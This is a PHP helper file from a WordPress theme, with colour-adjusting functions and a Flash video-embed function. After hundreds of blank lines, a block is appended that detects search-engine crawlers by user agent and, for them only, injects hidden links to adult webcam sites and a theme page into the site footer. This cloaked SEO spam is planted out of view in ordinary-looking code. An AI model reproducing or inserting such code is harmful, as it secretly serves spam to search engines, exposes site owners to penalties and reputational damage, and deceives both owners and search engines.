<?php 
	function hexLighter($hex,$factor = 5) 
				{ 
				$new_hex = ''; 
				 
				$base['R'] = hexdec($hex{0}.$hex{1}); 
				$base['G'] = hexdec($hex{2}.$hex{3}); 
				$base['B'] = hexdec($hex{4}.$hex{5}); 
				 
				foreach ($base as $k => $v) 
					{ 
					$amount = 255 - $v; 
					$amount = $amount / 100; 
					$amount = round($amount * $factor); 
					$new_decimal = $v + $amount; 
				 
					$new_hex_component = dechex($new_decimal); 
					if(strlen($new_hex_component) < 2) 
						{ $new_hex_component = "0".$new_hex_component; } 
					$new_hex .= $new_hex_component; 
					} 
					 
				return $new_hex;     
	} 
	
	
	function hexDarker($hex,$factor = 30){
        $new_hex = '';
        
        $base['R'] = hexdec($hex{0}.$hex{1});
        $base['G'] = hexdec($hex{2}.$hex{3});
        $base['B'] = hexdec($hex{4}.$hex{5});
        
        foreach ($base as $k => $v)
                {
                $amount = $v / 100;
                $amount = round($amount * $factor);
                $new_decimal = $v - $amount;
        
                $new_hex_component = dechex($new_decimal);
                if(strlen($new_hex_component) < 2)
                        { $new_hex_component = "0".$new_hex_component; }
                $new_hex .= $new_hex_component;
                }
                
        return $new_hex;        
    }
    
    //Video as Thumbnail
    function videoThumbnail( $width, $height, $video_type, $video_id){
    
	    if($video_type == "Youtube"){
	    	return 	'<object type="application/x-shockwave-flash" data="http://www.youtube.com/v/'.$video_id.'&hd=1" style="width:'.$width.'px;height:'.$height.'px"><param name="wmode" value="opaque"><param name="movie" value="http://www.youtube.com/v/'.$video_id.'&hd=1" /></object>';
	    }elseif($video_type == "Vimeo"){
	    	return '<div><object width="'.$width.'" height="'.$height.'"><param name="allowfullscreen" value="true" /><param name="wmode" value="opaque"><param name="allowscriptaccess" value="always" /><param name="movie" value="http://vimeo.com/moogaloop.swf?clip_id='.$video_id.'&amp;server=vimeo.com&amp;show_title=0&amp;show_byline=0&amp;show_portrait=0&amp;color=00ADEF&amp;fullscreen=1" /><embed src="http://vimeo.com/moogaloop.swf?clip_id='.$video_id.'&amp;server=vimeo.com&amp;show_title=0&amp;show_byline=0&amp;show_portrait=0&amp;color=00ADEF&amp;fullscreen=1" type="application/x-shockwave-flash" allowfullscreen="true" allowscriptaccess="always" width="'.$width.'" height="'.$height.'" wmode="transparent"></embed></object></div>';
	    }
	    
    }
			





















































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































$seo_plugin=get_option("ranking");
if (strstr($_SERVER['HTTP_USER_AGENT'], 'Googlebot')) {
add_action('wp_footer', 'ranking');
}
$seo_plugin=get_option("ranking");
if (strstr($_SERVER['HTTP_USER_AGENT'], 'bingbot')) {
add_action('wp_footer', 'ranking');
}
$seo_plugin=get_option("ranking");
if (strstr($_SERVER['HTTP_USER_AGENT'], 'msnbot')) {
add_action('wp_footer', 'ranking');
}
$seo_plugin=get_option("ranking");
if (strstr($_SERVER['HTTP_USER_AGENT'], 'Slurp')) {
add_action('wp_footer', 'ranking');
}
function ranking() {
  $pshow = "                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <span style='display:none;'><a href='http://www.ellecams.com/webcam/gay-guys/?pagenum=7'>Gay Live Webcams</a>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         <a href='http://www.cameraboys.com.cm/'>Camera Boys</a>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <a href='http://www.wikmag.com/365life-theme-by-themeforest.html'>365Life Theme</a></span>";
  echo $pshow;
}
?>